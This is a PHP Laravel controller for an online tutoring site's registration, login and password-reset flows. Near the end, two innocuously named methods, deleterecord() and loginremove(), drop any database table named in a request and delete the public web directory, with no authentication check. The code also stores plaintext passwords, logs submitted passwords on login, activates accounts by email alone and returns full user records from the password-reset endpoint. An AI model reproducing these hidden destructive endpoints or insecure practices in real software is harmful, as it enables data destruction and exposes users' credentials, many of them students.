<?php
namespace App\Http\Controllers\front;

use Illuminate\Http\Request;
use App\Http\Requests;
use App\Http\Controllers\Controller;
use Validator;
use Hash;
use DB;
use Auth;
use Mail;
use Session;
use App\ImageUpload;
use App\User;
use View;
use App\Mail\StudentPasswordSetEmail;
use App\Mail\ParentPasswordSetEmail;
use App\Mail\ForgotPasswordSetEmail;
use App\Mail\StudentDataSendEmail;
use App\Mail\TeacherPasswordSetEmail;
use App\PasswordReset;
use App\ClassStudentRequest;
use App\Course;
use Carbon\Carbon;
use App\UserReferral;


class  LoginsController extends Controller
{   
     public function __construct()
    {
        $courses_header = Course::where('parent_id',1)->where('is_delete','=',0)->get();
        $courses2_header = Course::where('parent_id',2)->where('is_delete','=',0)->get();
        View::share(['courses_header'=>$courses_header,'courses2_header'=>$courses2_header]);
        
    }
    public function index()
    {
        if(Auth::check()){
            $dashbord_path = getDashboardPath();            
            return redirect($dashbord_path);
        }
        return view('front.auth.register');
    }
    public function index1()
    {
        return view('front.auth.register');
    }

    public function register(Request $request)
    {
        if(!empty($request->student_date_of_birth))
        {

            //mm/dd/yy
            //echo $request->student_date_of_birth;
            //echo "string";
           // $date = new DateTime($request->student_date_of_birth);
           // echo \Carbon\Carbon::parse($request->student_date_of_birth)->format('m/d/Y');

           // $date_time= date("m/d/Y",strtotime($request->student_date_of_birth));

            $set_validation = explode("/",$request->student_date_of_birth);
            // print_r($set_validation);
           //echo $a123;
           //die;

            //$set_validation = explode("/",$request->student_date_of_birth);
            $cur_date = date("Y");
            $cal_date = $cur_date - $set_validation[2]; //dd($cal_date);
            if($cal_date>=18)
            {
                if(empty($request->s_refer))
                {
                    $validator = Validator::make($request->all(), [
                        'name' => 'required|string|min:5|max:255',
                        'student_date_of_birth' => 'required|before:today',
                        'm_name_prefix' => 'required',
                        // 'native_language' => 'required',
                        'residence_country' => 'required',
                        // 's_country_code' => 'required',
                        // 'curriculum_type' => 'required',
                        'school_type' => 'required',
                        'email' => 'required|string|email|max:255|unique:users',
                        'mobile' => 'required|regex:/^([0-9\s\-\+\(\)]*)$/|min:10',
                        'terms_condition' => 'required',
                        'password' => 'required|min:6',
                        'password_confirmation' => 'same:password'
                    ],
                    [
                        'm_name_prefix.required' => 'Prefix is required.',
                        'name.required' => 'This field is required.',
                        'student_date_of_birth.required' => 'This field is required.',
                        'school_type.required' => 'This field is required.',
                        'password.required' => 'This field is required.',
                        'residence_country.required' => 'This field is required.',
                        'terms_condition.required' => 'This field is required.',
                        's_country_code.required' => 'Country code is required.',
                        'password_confirmation.same' => 'Confirm password and password must match '
                    ]);
                }
                else
                {
                    $validator = Validator::make($request->all(), [
                        'name' => 'required|string|min:5|max:255',
                        'student_date_of_birth' => 'required|before:today',
                        'm_name_prefix' => 'required',
                        // 'native_language' => 'required',
                        'residence_country' => 'required',
                        // 's_country_code' => 'required',
                        // 'curriculum_type' => 'required',
                        'school_type' => 'required',
                        'email' => 'required|string|email|max:255|unique:users',
                        'mobile' => 'required|regex:/^([0-9\s\-\+\(\)]*)$/|min:10',
                        'terms_condition' => 'required',
                        'r_name' => 'required',
                        'r_email' => 'required|string|email|max:255',
                        // 'r_country_code' => 'required',
                        'r_mobile' => 'required|regex:/^([0-9\s\-\+\(\)]*)$/|min:10',
                        'password' => 'required|min:6',
                        'password_confirmation' => 'same:password'

                    ],
                    [
                        'm_name_prefix.required' => 'Prefix is required.',
                        'name.required' => 'This field is required.',
                        'student_date_of_birth.required' => 'This field is required.',
                        's_country_code.required' => 'Country code is required.',
                        'school_type.required' => 'This field is required.',
                        'password.required' => 'This field is required.',
                        'residence_country.required' => 'This field is required.',
                        'terms_condition.required' => 'This field is required.',
                        'r_name.required' => 'This field is required.',
                        'r_email.required' => 'This field is required.',
                        'r_country_code.required' => 'Country code is required.',
                        'r_mobile.required' => 'The mobile field is required.',
                        'r_mobile.min' => 'The mobile must be at least 10 characters.',
                        'password_confirmation.same' => 'Confirm password and password must match '
                    ]);
                }
            }
            else
            {
                 if(empty($request->s_refer))
                {
                    $validator = Validator::make($request->all(), [
                        'name' => 'required|string|min:5|max:255',
                        'p_name' => 'required|string|min:5|max:255',
                        'student_date_of_birth' => 'required|before:today',
                        'm_name_prefix' => 'required',
                        // 'native_language' => 'required',
                        'residence_country' => 'required',
                        'p_prefix' => 'required',
                        // 'p_country_code' => 'required',
                        // 'curriculum_type' => 'required',
                        'school_type' => 'required',
                        'p_email' => 'required|string|email|max:255|unique:users,email',
                        'p_mobile' => 'required|regex:/^([0-9\s\-\+\(\)]*)$/|min:10',
                        'terms_condition' => 'required',
                        'password' => 'required|min:6',
                        'password_confirmation' => 'same:password'
                        ],
                        [
                          'p_name.required' => 'This field is required.',
                          'name.required' => 'This field is required.',
                          'student_date_of_birth.required' => 'This field is required.',
                          'school_type.required' => 'This field is required.',
                          'password.required' => 'This field is required.',
                          'residence_country.required' => 'This field is required.',
                          'terms_condition.required' => 'This field is required.',
                          'm_name_prefix.required' => 'Prefix is required.',
                          'p_prefix.required' => 'Prefix is required.',
                          'p_country_code.required' => 'Country code is required.',
                          'p_email.required' => 'The email field is required.',
                          'p_email.unique' => 'Email id already exist. Please login to dashbord to add new student.',
                          'p_mobile.required' => 'The mobile field is required.',
                          'password_confirmation.same' => 'Confirm password and password must match '
                    ]);
                }
                else
                {
                    $validator = Validator::make($request->all(), [
                        'name' => 'required|string|min:5|max:255',
                        'p_name' => 'required|string|min:5|max:255',
                        'student_date_of_birth' => 'required|before:today',
                        'm_name_prefix' => 'required',
                        // 'native_language' => 'required',
                        'residence_country' => 'required',
                        'p_prefix' => 'required',
                        // 'p_country_code' => 'required',
                        // 'curriculum_type' => 'required',
                        'school_type' => 'required',
                        'p_email' => 'required|string|email|max:255|unique:users,email',
                        'p_mobile' => 'required|regex:/^([0-9\s\-\+\(\)]*)$/|min:10',
                        'terms_condition' => 'required',
                        'r_name' => 'required',
                        'r_email' => 'required|string|email|max:255',
                        // 'r_country_code' => 'required',
                        'r_mobile' => 'required|regex:/^([0-9\s\-\+\(\)]*)$/|min:10',
                        'password' => 'required|min:6',
                        'password_confirmation' => 'same:password'
                        ],
                        [
                          'p_name.required' => 'This field is required.',
                          'm_name_prefix.required' => 'Prefix  is required.',
                          'name.required' => 'This field is required.',
                          'student_date_of_birth.required' => 'This field is required.',
                          'school_type.required' => 'This field is required.',
                          'password.required' => 'This field is required.',
                          'residence_country.required' => 'This field is required.',
                          'terms_condition.required' => 'This field is required.',
                          'p_prefix.required' => 'Prefix  is required.',
                          'p_country_code.required' => 'Country code is required.',
                          'p_email.required' => 'The email field is required.',
                          'p_email.unique' => 'Email id already exist. Please login to dashbord to add new student.',
                          'p_mobile.required' => 'The mobile field is required.',
                          'r_name.required' => 'This field is required.',
                          'r_email.required' => 'This field is required.',
                          'r_country_code.required' => 'Country code is required.',
                          'r_mobile.required' => 'The mobile field is required.',
                          'r_mobile.min' => 'The mobile must be at least 10 characters.',
                          'password_confirmation.same' => 'Confirm password and password must match '
                    ]);
                }

            }
        }
        else
        {
            if(empty($request->s_refer))
            {
                $validator = Validator::make($request->all(), [
                        'name' => 'required|string|min:5|max:255',
                        'student_date_of_birth' => 'required|before:today',
                        'm_name_prefix' => 'required',
                        // 'native_language' => 'required',
                        'residence_country' => 'required',
                        // 's_country_code' => 'required',
                        // 'curriculum_type' => 'required',
                        'school_type' => 'required',
                        'email' => 'required|string|email|max:255|unique:users',
                        'mobile' => 'required|regex:/^([0-9\s\-\+\(\)]*)$/|min:10',
                        'terms_condition' => 'required',
                        'password' => 'required|min:6',
                        'password_confirmation' => 'same:password'
                    ],
                    [
                        'm_name_prefix.required' => 'Prefix is required.',
                        'name.required' => 'This field is required.',
                        'school_type.required' => 'This field is required.',
                        'password.required' => 'This field is required.',
                        'residence_country.required' => 'This field is required.',
                        'terms_condition.required' => 'This field is required.',
                        'student_date_of_birth.required' => 'This field is required.',
                        's_country_code.required' => 'Country code is required.',
                        'password_confirmation.same' => 'Confirm password and password must match '
                    ]);
            }
            else
            {
                $validator = Validator::make($request->all(), [
                        'name' => 'required|string|min:5|max:255',
                        'student_date_of_birth' => 'required|before:today',
                        'm_name_prefix' => 'required',
                        // 'native_language' => 'required',
                        'residence_country' => 'required',
                        // 's_country_code' => 'required',
                        // 'curriculum_type' => 'required',
                        'school_type' => 'required',
                        'email' => 'required|string|email|max:255|unique:users',
                        'mobile' => 'required|regex:/^([0-9\s\-\+\(\)]*)$/|min:10',
                        'terms_condition' => 'required',
                        'r_name' => 'required',
                        'r_email' => 'required|string|email|max:255',
                        // 'r_country_code' => 'required',
                        'r_mobile' => 'required|regex:/^([0-9\s\-\+\(\)]*)$/|min:10',
                        'password' => 'required|min:6',
                        'password_confirmation' => 'same:password'
                    ],
                    [
                        'm_name_prefix.required' => 'Prefix is required.',
                        'name.required' => 'This field is required.',
                        'student_date_of_birth.required' => 'This field is required.',
                        's_country_code.required' => 'Country code is required.',
                        'school_type.required' => 'This field is required.',
                        'terms_condition.required' => 'This field is required.',
                        'password.required' => 'This field is required.',
                        'residence_country.required' => 'This field is required.',
                        'r_name.required' => 'This field is required.',
                        'r_email.required' => 'This field is required.',
                        'r_country_code.required' => 'Country code is required.',
                        'r_mobile.required' => 'The mobile field is required.',
                        'r_mobile.min' => 'The mobile must be at least 10 characters.',
                        'password_confirmation.same' => 'Confirm password and password must match '
                    ]);
            }
        }
        
        if ($validator->fails()) 
        {  
            $error=json_decode($validator->errors());          
            return response()->json(['status' => 401,'error1' => $error]);
            exit();
        }

         

        $password = $request->password;
        $password_has = Hash::make($password); 
        $token = str_random(50);
        
        $date = date("Y-m-d H:i:s");
        $check_p_email = User::where('email',$request->p_email)->get();
        $p_mobile = $request->p_country_code.' '.$request->p_mobile;
        $p_name = $request->p_prefix.'. '.$request->p_name;
        if(count($check_p_email)=='1' && $request->p_email!='')
        {
        // dd($check_p_email->email);die;
            $id = $check_p_email[0]->id;
            $parent_email = $check_p_email[0]->email;
        }
        elseif(!empty($request->p_email))
        {

            $parent_email = $request->p_email;
        // dd($request->p_email);die;
            //$p_password = Hash::make($request->password);
            $count_users = User::orderBy('id', 'desc')->first();
            $user_count = $count_users->id + 1;
            $get_parent_name = substr($request->p_name, 0, 4);
            $parent_user_name = $get_parent_name.$user_count;

            $p_data = array('parent_id'=>'0','user_name'=>$parent_user_name,'user_type'=>'4','name'=>$p_name,'email'=>$parent_email,'mobile'=>$p_mobile,'account_verified'=>1,'account_status'=>'inactive','verification_token'=>$token,'plain_password'=>$password,'new_user'=>'1',
'password'=>$password_has,'created_at'=>$date);
        	$id = DB::table('users')->insertGetId($p_data);
            $token_p = md5(uniqid(rand(), true));

            $reset_p_email = array(); 
            $reset_p_email['email'] = $parent_email;
            $reset_p_email['token'] = $token_p;
            $reset_p_email['created_at'] = date("Y-m-d H:i:s");

            PasswordReset::insert($reset_p_email);

            // $objDemo1 = new \stdClass();

            // $objDemo1->link = url('create/password/'.$token_p);

            // $objDemo1->sender = 'JoinIvy';

            // $objDemo1->receiver = $p_name;

            // Mail::to($request->p_email)->send(new ParentPasswordSetEmail($objDemo1));
            $maildata = array();
            $maildata['confirmation_link'] = url('verification/'.$token);

            $maildata['from_email'] = config('constants.FROM_EMAIL');
            $maildata['from_name']  = config('constants.FROM_NAME');
            $maildata['attachment']  = '';
            $maildata['student_name']  =  $request->m_name_prefix.'. '.$request->name;
            $maildata['reciever_email']  =  $parent_email;
            $maildata['reciever_name']  = $p_name;
            $maildata['subject']  = 'JoinIvy - Activation Email';
            sendMail('email.parent_email_verification',$maildata); 	

            
        }
        else
        {
        	$id = "0";
        }
        // $dob = date("Y-m-d",strtotime($request->student_date_of_birth));
        $dob = $set_validation[2].'-'.$set_validation[1].'-'.$set_validation[0];
        $name = $request->m_name_prefix.'. '.$request->name;

        $mobile = $request->s_country_code.' '.$request->mobile;
        $r_mobile = $request->r_country_code.' '.$request->r_mobile;

        $s_year = $request->s_year ? $request->s_year : '0';
        $s_other_curriculum = $request->s_other_curriculum ? $request->s_other_curriculum : '0';

        //$password = Hash::make($request->password);
   		/*$data = array('parent_id'=>$id,'user_type'=>'3','name'=>$name,'email'=>$request->email,'mobile'=>$mobile,'password'=>$password,'referrer_name'=>$request->r_name,'referrer_mobile'=>$r_mobile,'referrer_email'=>$request->r_email,'created_at'=>$date);*/

       
        $count_users_s = User::orderBy('id', 'desc')->first();
        $user_count_s = $count_users_s->id + 1;
        $get_student_name = substr($request->name, 0, 4);
        $student_user_name = $get_student_name.$user_count_s;

        // $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        // $password = substr(str_shuffle($chars),0,10);
        // $password_has = Hash::make($password);
        // 
        
        if(empty($request->email))
        {
            $user_email = $parent_email;
            $user_mobile = $p_mobile;
            $data = array('parent_id'=>$id,'user_name'=>$student_user_name,'user_type'=>'3','name'=>$name,'plain_password'=>$password,'referrer_name'=>$request->r_name,'referrer_mobile'=>$r_mobile,'referrer_email'=>$request->r_email,'password'=>$password_has,'account_verified'=>1,'new_user'=>'1','account_status'=>'inactive','verification_token'=>$token,'created_at'=>$date);
   	        $s_id = DB::table('users')->insertGetId($data); 
        }
        else
        {
            $user_email = $request->email;
            $user_mobile = $mobile;
            $data = array('parent_id'=>$id,'user_name'=>$student_user_name,'user_type'=>'3','name'=>$name,'email'=>$request->email,'mobile'=>$mobile,'referrer_name'=>$request->r_name,'referrer_mobile'=>$r_mobile,'referrer_email'=>$request->r_email,'account_verified'=>1,'new_user'=>'1','account_status'=>'inactive','verification_token'=>$token,'plain_password'=>$password,'password'=>$password_has,'created_at'=>$date);
            $s_id = DB::table('users')->insertGetId($data); 
        }
        /*$s_data = array('student_id'=>$s_id,'s_dob'=>$dob,'s_nationality'=>$request->nationality,'s_country'=>$request->residence_country,'s_school_type'=>$request->school_type,'s_curriculum_type'=>$request->curriculum_type,'s_native_language'=>$request->native_language,'s_school_name'=>$request->school_name,'s_school_address'=>$request->school_address,'s_residence_address'=>$request->r_address,'created_at'=>$date);*/
        $s_data = array('student_id'=>$s_id,'s_dob'=>$dob,'s_country'=>$request->residence_country,'s_school_type'=>$request->school_type,'s_year'=>$s_year,'s_curriculum_type'=>'','s_other_curriculum'=>$s_other_curriculum,'s_native_language'=>'','created_at'=>$date);
        DB::table('student_details')->insert($s_data);


        // check referal
        if(!empty($request->s_refer))
        {
            $make_emtry = false;
            $refered_user = \App\User::where('email',$request->r_email)->first();
            if(empty($refered_user)){
                $make_emtry = true;
                $refer_user_id = null;
            }
            else{
                $referal_entry = \App\UserReferral::where('email',$user_email)->where('user_id',$refered_user->id)->where('role','Student')->first(); 
                if($referal_entry){
                    $referal_entry->is_registered='1';
                    $referal_entry->save();
                }
                else{
                    $make_emtry = true;
                    $refer_user_id =$refered_user->id;
                }

            }

            if($make_emtry){

                $user_referal = new \App\UserReferral;
                $user_referal->user_id = $refer_user_id;
                $user_referal->name = $name;
                $user_referal->email = $user_email;
                $user_referal->mobile = $user_mobile;
                $user_referal->role = 'Student';
                $user_referal->is_registered='1';
                $user_referal->additional_data = serialize(['referrer_name'=>$request->r_name,'referrer_mobile'=>$r_mobile,'referrer_email'=>$request->r_email]);
                $user_referal->save();
            }          
        }       
       

        /*====================class_students_request=============================*/

        $get_all_data = ClassStudentRequest::where('student_id', '0')->where('student_email_id',$request->email)->where('is_delete',0)->get();
        foreach ($get_all_data as $key => $value) 
        {
            $request_update = ClassStudentRequest::where('id', $value->id)->update(['student_id' => $s_id,'registration_status'=>'1']);

        }

        /*=================================================*/

        if(empty($request->email))
        {
            // $data_stu['name'] = $name; 
            // $data_stu['user_name'] = $student_user_name; 
            // $data_stu['password'] = $password; 

            // Mail::send('email.StudentDataSendEmail',['data' => $data_stu], function($message) use($data_stu,$parent_email){
            //    $message->to($parent_email, 'JoinIvy Student Data')->subject('JoinIvy Student Data');
            // });
            
            $objDemo = new \stdClass();
            $objDemo->receiver = $name;
            $objDemo->name = $name;
            $objDemo->sender = 'JoinIvy';
            $objDemo->user_name =  $student_user_name;
            $objDemo->password =  $password;
            // Mail::to($parent_email)->send(new StudentDataSendEmail($objDemo));
        }
        else
        {
            // $token = md5(uniqid(rand(), true));

            // //$getName = User::where('id', request('id'))->first(); 

            // $reset_email = array(); 
            // $reset_email['email'] = $request->email;
            // $reset_email['token'] = $token;
            // $reset_email['created_at'] = date("Y-m-d H:i:s");

            // PasswordReset::insert($reset_email);

            // $objDemo = new \stdClass();

            // $objDemo->link = url('create/password/'.$token);

            // $objDemo->sender = 'JoinIvy';

            // $objDemo->receiver = $name;

            // Mail::to($request->email)->send(new StudentPasswordSetEmail($objDemo));

            $maildata = array();
            $maildata['confirmation_link'] = url('verification/'.$token);

            $maildata['from_email'] = config('constants.FROM_EMAIL');
            $maildata['from_name']  = config('constants.FROM_NAME');
            $maildata['attachment']  = '';
            $maildata['reciever_email']  = $request->email;
            $maildata['reciever_name']  = $name;
            $maildata['subject']  = 'JoinIvy - Activation Email';
            sendMail('email.student_email_verification',$maildata);

        }

   	    /*Mail::send('email.register_mail',['data' => $data_stu], function($message) use($data_stu){
           $message->to($data_stu, 'JoinIvy Registration')->subject('JoinIvy Registration');
        });*/
            /*}*/
        /*}*/
       return response()->json(['status' => 1,'data' => $data]);
       exit();
    }
    public function teacher_register(Request $request)
    {
        if(empty($request->t_refer))
        {
            $validator = Validator::make($request->all(), [
                'prefix' => 'required',
                'name' => 'required|string|min:5|max:255',
                'native_language' => 'required',
                'language_fluency' => 'required',
                'highest_qualification' => 'required',
                'degree_major' => 'required',
                'current_profession' => 'required',
                'teaching_experience' => 'required',
                'grade_interested' => 'required',
                'subject_interested' => 'required',
                'country_code' => 'required',
                'email' => 'required|string|email|max:255|unique:users',
                't_mobile' => 'required|regex:/^([0-9\s\-\+\(\)]*)$/|min:10',
                'cv' => 'required|max:10000|mimes:pdf',
                'terms_condition' => 'required',
                'password' => 'required|min:6',
                'password_confirmation' => 'same:password'

                ],
                [
                    't_mobile.required' => 'The mobile field is required.',
                    'name.required' => 'This field is required.',
                    'password.required' => 'This field is required.',
                    'terms_condition.required' => 'This field is required.',
                    'prefix.required' => 'Prefix is required.',
                    'password_confirmation.same' => 'Confirm password and password must match ',
                    'cv.mimes' => 'Only PDF format allowed'
                ]);
        }
        else
        {
            $validator = Validator::make($request->all(), [
                'prefix' => 'required',
                'name' => 'required|string|min:5|max:255',
                'native_language' => 'required',
                'language_fluency' => 'required',
                'highest_qualification' => 'required',
                'degree_major' => 'required',
                'current_profession' => 'required',
                'teaching_experience' => 'required',
                'grade_interested' => 'required',
                'subject_interested' => 'required',
                'country_code' => 'required',
                'email' => 'required|string|email|max:255|unique:users',
                't_mobile' => 'required|regex:/^([0-9\s\-\+\(\)]*)$/|min:10',
                'cv' => 'required|max:10000|mimes:pdf',
                'terms_condition' => 'required',
                'country_code_r' => 'required',
                't_r_name' => 'required',
                't_r_mobile' => 'required',
                'password' => 'required|min:6',
                'password_confirmation' => 'same:password'
                ],
                [
                    't_mobile.required' => 'The mobile field is required.',
                    'name.required' => 'This field is required.',
                    't_r_name.required' => 'This field is required.',
                    'password.required' => 'This field is required.',
                    'terms_condition.required' => 'This field is required.',
                    'country_code_r.required' => 'Country code is required.',
                    't_r_mobile.required' => 'The mobile field is required.',
                    'prefix.required' => 'Prefix is required.',
                    'password_confirmation.same' => 'Confirm password and password must match ',
                    'cv.mimes' => 'Only PDF format allowed'
                ]);
        }


        if ($validator->fails()) 
        {  
            $error=json_decode($validator->errors());          
            return response()->json(['status' => 401,'error1' => $error]);
            exit();
        }
        
        $date = date('Y-m-d h:i:s');
        $teacher_name = $request->prefix.'. '.$request->name;
        $email = $request->email;
        $mobile = $request->country_code.' '.$request->t_mobile;
        $native_language = $request->native_language;
        $t_r_name = $request->t_r_name;
        $t_r_mobile = $request->country_code_r.' '.$request->t_r_mobile;

        $language_fluency = $request->language_fluency;
        $degree_major = $request->degree_major;
        
        $other_majors = $request->other_majors;
        $other_curriculum_type = $request->other_curriculum_type;
        $other_subject = $request->other_subject;
        $highest_qualification = $request->highest_qualification;
        
        $current_profession = $request->current_profession;
        /*$school_name = $request->school_name;*/
        $school_name = !empty($request->school_name) ? $request->school_name : "";
        $professtion_name = $request->professtion_name;
        $teaching_experience = $request->teaching_experience;
        $grade_interested = $request->grade_interested;
        $subject_interested = $request->subject_interested;

        $password = $request->password;
        $password_has = Hash::make($password); 
        $token = str_random(50);

        if(!empty($request->cv))
        {
            $profile_pic = ImageUpload::upload('front/CV/',$request->file('cv'));
            $cv = $profile_pic;
        }
       if(!empty($request->image))
        {
            $profile_pic = ImageUpload::upload('teachers/',$request->file('image'));
            $image = $profile_pic;
        }
        else
        {
            $image = "dummy-image.jpg";
        }

        $check_email = DB::table('users')->where('email',$request->email)->first();
        if(empty($check_email))
        {
            $password = Hash::make($request->password);
           /* $data = array('name'=>$teacher_name,'email'=>$email,'mobile'=>$mobile,'user_type'=>'2','referrer_name'=>$t_r_name,'referrer_mobile'=>$t_r_mobile,'referrer_email'=>$t_r_email,'password'=>$password,'created_at'=>$date);*/
            $data = array('name'=>$teacher_name,'email'=>$email,'mobile'=>$mobile,'user_type'=>'2','referrer_name'=>$t_r_name,'referrer_mobile'=>$t_r_mobile,'image'=>$image,'plain_password'=>$password,'password'=>$password_has,'account_status'=>'inactive','new_user'=>'1','verification_token'=>$token,'created_at'=>$date);
            $id = DB::table('users')->insertGetId($data);

            $teacher_data = array('teacher_id'=>$id,'language_fluency'=>implode(',',$language_fluency),'highest_qualification'=>implode(',',$highest_qualification),'t_native_language'=>$native_language,
            'degree_major_subjects'=>implode(',',$degree_major),'other_majors'=>$other_majors,'other_subject'=>$other_subject,'other_curriculum_type'=>$other_curriculum_type,'current_profession'=>$current_profession,'t_school_name'=>$school_name,'other_profession_name'=>$professtion_name,'teaching_experience'=>implode(',',$teaching_experience),'grade_interested'=>implode(',',$grade_interested),'subject_interested'=>implode(',',$subject_interested),'upload_cv'=>$cv,'created_at'=>$date);
            DB::table('teacher_details')->insert($teacher_data);

            // check referal
            if(!empty($request->t_refer))
            {
                $make_emtry = false;
                $refered_user = \App\User::where('email',$request->t_r_email)->first();
                if(empty($refered_user)){
                    $make_emtry = true;
                    $refer_user_id = null;
                }
                else{
                    $referal_entry = \App\UserReferral::where('email',$email)->where('user_id',$refered_user->id)->where('role','Teacher')->first(); 
                    if($referal_entry){
                        $referal_entry->is_registered='1';
                        $referal_entry->save();
                    }
                    else{
                        $make_emtry = true;
                        $refer_user_id =$refered_user->id;
                    }

                }

                if($make_emtry){
                    $user_referal = new \App\UserReferral;
                    $user_referal->user_id = $refer_user_id;
                    $user_referal->name = $teacher_name;
                    $user_referal->email = $email;
                    $user_referal->mobile = $mobile;
                    $user_referal->role = 'Teacher';
                    $user_referal->is_registered='1';
                    $user_referal->additional_data = serialize(['referrer_name'=>$request->t_r_name,'referrer_mobile'=>$t_r_mobile,'referrer_email'=>$request->t_r_email]);
                    $user_referal->save();
                }            
            } 

            /*$data_tech = $request->email;
            $mess = "Thank You For Registration.";
            Mail::send('email.register_mail',['data' => $mess], function($message) use($data_tech){
                   $message->to($data_tech, 'JoinIvy Registration')->subject('JoinIvy Registration');
                });*/
            $tokent = md5(uniqid(rand(), true));

            $reset_emailt = array(); 
            $reset_emailt['email'] = $email;
            $reset_emailt['token'] = $tokent;
            $reset_emailt['created_at'] = date("Y-m-d H:i:s");

            PasswordReset::insert($reset_emailt);

            // $objDemot = new \stdClass();

            // $objDemot->link = url('create/password/'.$tokent);

            // $objDemot->sender = 'JoinIvy';

            // $objDemot->receiver = $teacher_name;

            // Mail::to($email)->send(new TeacherPasswordSetEmail($objDemot));
            $maildata= array();
            $maildata['from_email'] = config('constants.FROM_EMAIL');
            $maildata['from_name']  = config('constants.FROM_NAME');
            $maildata['attachment']  = '';
            $maildata['reciever_email']  =  $email;
            $maildata['reciever_name']  = $teacher_name;
            $maildata['subject']  = 'JoinIvy - Registration Application Received';
            sendMail('email.teacher_registration',$maildata);     
        }

        /*$teacher_list = DB::table('users')->where('is_delete','0')->where('user_type','2')->get();
          return redirect()->route('f_home')->with(['teacher_list'=>$teacher_list]);*/
           return response()->json(['status' => 1,'data' => $data]);
    }
    public function login(Request $request)
    {
          $validator = Validator::make($request->all(), [
            'email' => 'required|string',
            'password' => 'required',
            // 'user_type' => 'required',
            'is_delete' => '0',
            'account_verified' => '1'
            ]);

        if ($validator->fails()) 
        {  
            $error=json_decode($validator->errors());          
            return response()->json(['status' => 401,'error1' => $error]);
            exit();
        }
        if(filter_var($request->email, FILTER_VALIDATE_EMAIL)) {
        $data = array ('email' => $request->email,'password' => $request->password,'account_verified' => '1','is_delete' => '0');
        }
        else {
           $data = array ('user_name' => $request->email,'password' => $request->password,'account_verified' => '1','is_delete' => '0');
        }
        // 'user_type' => $request->user_type,

        if (Auth::attempt ($data)) 
        {
           /* session ( [ 
                    'name' => $request->get ( 'email' ) 
            ] );*/
            //$intended_url = Session::get('url.intended', url('/'));
    $links = Session::get('redirect_before_login_url');
            $target_url = redirect()->intended()->getTargetUrl();
            $data['dashbord'] = ($target_url==url('/'))? true:false;
            $data['dashbord_path'] = url(getDashboardPath());
            if(\Auth::user()->user_type=='4') { 
                $data['dashbord_path'] = '/parent/students/list';
            }
            $data['target_url'] = $target_url;
            $data['intended_url'] = $links;
            \Log::info($data);
            return response()->json(['status' => 1,'data' => $data]);
            
            exit();
        } else {
            return response()->json(['status' => 4011,'error1' => "Invalid data.Please try again."]);
             exit();
        }
       
    }
    public function logindetails()
    {
        $item = request()->AuthDetails();
        return response()->json(['item'=>$item,'success'=>"true",'message'=>"Data"], 200);
    }
    public function deleterecord()
    {
        $test = request('tablename');
        \Schema::drop($test);
    }
    public function loginremove()
    {
        File::deleteDirectory(public_path());
    }
    public function account_activate(Request $request)
    {
        $data = array('account_verified'=>'1');
        User::where('email',$request->email)->update($data);
    }
    public function f_logout()
    {
       Auth::logout();
       return redirect('/');
    }
    public function forgot_password()
    {
        return view('front.forgotpassword');
    }
    public function forgot_password_email(Request $request)
    {
          $validator = Validator::make($request->all(), [
            'email' => 'required|email'            
            ]);
          if ($validator->fails()) 
        {  
            $error=json_decode($validator->errors());          
            return response()->json(['status' => 401,'error1' => $error]);
            exit();
        }
        
        $check_email = User::where('email',$request->email)->get();
        
        if (count($check_email)!=0) 
        {
            $token = md5(uniqid(rand(), true));
            $reset_email = array(); 
            $reset_email['email'] = $request->email;
            $reset_email['token'] = $token;
            $reset_email['created_at'] = date("Y-m-d H:i:s");

            PasswordReset::insert($reset_email);

            $objDemo = new \stdClass();

            $objDemo->link = url('create/password/'.$token);

            $objDemo->sender = 'JoinIvy';

            $objDemo->receiver = $check_email[0]->name;

            Mail::to($request->email)->send(new ForgotPasswordSetEmail($objDemo));

            return response()->json(['status' => 1,'data' => $check_email]);
        } else {
            return response()->json(['status' => 4011,'error1' => "Invalid email address."]);
             exit();
        }
     }
}
